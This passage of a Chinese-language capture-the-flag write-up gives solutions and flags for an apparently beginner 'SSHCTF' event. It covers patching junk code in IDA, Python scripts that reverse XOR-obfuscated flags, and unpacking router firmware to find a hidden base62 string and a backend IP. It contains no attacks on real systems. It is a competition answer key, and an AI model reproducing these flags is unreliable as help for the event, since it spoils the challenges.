+选中这3条，Ctrl+N nop掉，回到main按一下P，再按F5，好了
+
+![flower_code](imgs/flower_code.png)
+
+``` python
+byte_402128 = [
+  123,  49,   4,  38,  58, 117, 101,  23,  22,   6,
+   95,  28,  43,  54,  10, 105, 110, 110, 101, 114,
+  125,   0,   0,   0
+]
+arr = [15, 21, 9, 123,  49,   4,  38,  58, 117, 101,  23,  22, 6, 95,  28,  43,  54,  10, 105, 110, 110, 101, 114, 125]
+i = 4
+j = 20
+
+while i > 0:
+    i -= 1
+    arr[j - 3] ^= arr[i + 20]
+    arr[j - 4] ^= arr[i + 15]
+    arr[j - 5] ^= arr[i + 10]
+    if j - 6 >= 0:
+        arr[j - 6] ^= arr[i + 5]
+    j -= 5
+
+print(''.join([chr(a) for a in arr]))
+
+# SSHCTF{Hey_u_cat_it_winner}
+```
+
+### [Signin] Check your IDA
+
+签到题，直接拖入ida
+
+``` 
+SSHCTF{Y0u_c@n_go_2_s1ove_0ther_r3v3rse_ch4l13ng3s_by_ida_n0w}
+```
+
+### baby xor
+
+无壳，直接拖入ida
+
+![ezre](imgs/ezre.png)
+
+``` python
+arr = [
+    50,  32,  50,  32,  50,  32,  79,   1,  77,  39,
+    18,   0,  71,  23,  22,  44,  34,  83,  20,  57,
+    5,  43, 125,  38,  37,  14,  40,  27,   4,   0,
+    14,  60,  35,  60, 107,  42,  71,  36,  40,  25,
+    4,  72,  15,  20, 7
+]
+Str = [
+    115, 115, 104, 99, 116, 102, 38, 88, 48, 82,
+    95, 107, 101, 121
+]
+
+for i in range(45):
+    if i & 1 == 0:
+        arr[i] ^= 0x12
+    arr[i] ^= Str[i % len(Str)]
+
+print("".join([chr(a) for a in arr]))
+
+# SSHCTF{You_k0nw_X0r_1s_the_best_EZ_revers1ng}
+```
+
+## Hardware
+
+### 路由器里藏了个黑猴？
+
+` binwalk -Me ` 解包.bin，打开发现squashfs-root里面没有文件
+
+用firmware-mod-kit再次解包1600900.squashfs，
+
+```
+/opt/firmware-mod-kit/trunk/unsquashfs_all.sh ./160090.squashfs
+```
+
+在/user/bin里面发现了猴 `Wuk0ng`
+
+``` python
+chunks= ("bHeN", "yiuj", "82yK", "Odrr", "pTyW", "kAJW", "QcPL", "HVVg", 
+         "CTjY", "JOnS", "CoqG", "uQCM", "wXoy", "RPK7", "RT1h", "kvi")
+print(''.join(chunks))
+
+# bHeNyiuj82yKOdrrpTyWkAJWQcPLHVVgCTjYJOnSCoqGuQCMwXoyRPK7RT1hkvi
+```
+
+base系列编码，拼接起来后到[CyberChef ](https://gchq.github.io/CyberChef/)解码，尝试过后是base62
+
+``` 
+SSHCTF{H1_1_@M_H3r3_bL@cK_mYtH_wUk0nG_G0G0G0}
+```
+
+### 奇怪了，我怎么访问后台呢
+
+` binwalk -Me ` 解包.bin
+
+然后找ip `grep -rEo '192\.168\.[0-9]{1,3}\.[0-9]{1,3}'` 
+
+![backend](.\imgs\backend.png)
+
+最终在 ` etc/uci-defaults/zz-asu-defaults` 中找到
+
+![backend2](C:\Users\Mingz\Desktop\ctf\24新生赛一轮\0WP\imgs\backend2.png)
+
+``` 
+SSHCTF{192.168.99.81}
+```
